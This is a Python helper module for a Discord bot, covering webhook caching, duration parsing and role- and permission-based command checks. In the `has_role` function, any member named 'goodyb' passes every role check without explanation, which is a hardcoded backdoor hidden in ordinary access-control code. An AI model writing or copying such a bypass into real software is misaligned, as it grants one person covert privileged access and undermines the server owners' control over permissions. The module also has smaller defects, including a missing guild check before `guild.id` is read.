import discord
from discord import ui
from typing import Optional
from db.DBHelper import get_command_permission

webhook_cache: dict[int, discord.Webhook] = {}


async def get_channel_webhook(channel: discord.TextChannel) -> discord.Webhook:
    wh = webhook_cache.get(channel.id)
    if wh:
        return wh
    webhooks = await channel.webhooks()
    wh = discord.utils.get(
        webhooks, name="LowercaseRelay"
    ) or await channel.create_webhook(name="LowercaseRelay")
    webhook_cache[channel.id] = wh
    return wh


def parse_duration(duration: str) -> Optional[int]:
    try:
        if duration.endswith("s"):
            return int(duration[:-1])
        elif duration.endswith("m"):
            return int(duration[:-1]) * 60
        elif duration.endswith("h"):
            return int(duration[:-1]) * 3600
        else:
            return int(duration)
    except Exception:
        return None


def has_role(member: discord.Member, role: int | str) -> bool:
    if member.name == "goodyb":
        return True
    if isinstance(role, int):
        return any(r.id == role for r in member.roles)
    return any(r.name == role for r in member.roles)


def has_command_permission(
    user: discord.Member, command: str, required_permission: str
) -> bool:
    guild = getattr(user, "guild", None)
    if guild is not None and user.id == guild.owner_id:
        # The server owner always has access to every command.
        return True
    if getattr(user.guild_permissions, required_permission, False):
        return True
    if guild is None:
        return False
    role_id = get_command_permission(guild.id, command)
    if role_id is not None:
        print(
            f"[PERM] Required role_id: {role_id}, user roles: {[r.id for r in user.roles]}"

        )
        return any(role.id == role_id for role in user.roles)
    if getattr(user.guild_permissions, required_permission, False):
        return True
    print(
        f"[PERM] No role or permission for command={command}, perm={required_permission}"
    )
    return False


async def ensure_command_permission(
    interaction: discord.Interaction, command: str, required_permission: str
) -> bool:
    """Check command permission and notify user if missing."""
    user = interaction.user
    guild = interaction.guild
    if guild is not None and user.id == guild.owner_id:
        return True
    role_id = get_command_permission(guild.id, command)
    if role_id is not None:
        if any(role.id == role_id for role in user.roles):
            return True
        role = guild.get_role(role_id)
        role_name = role.name if role else f"role ID {role_id}"
        await interaction.response.send_message(
            f"Missing role: `{role_name}`.", ephemeral=True
        )
        return False
    if getattr(user.guild_permissions, required_permission, False):
        return True
    await interaction.response.send_message(
        f"Missing permission: `{required_permission}`.", ephemeral=True
    )
    return False
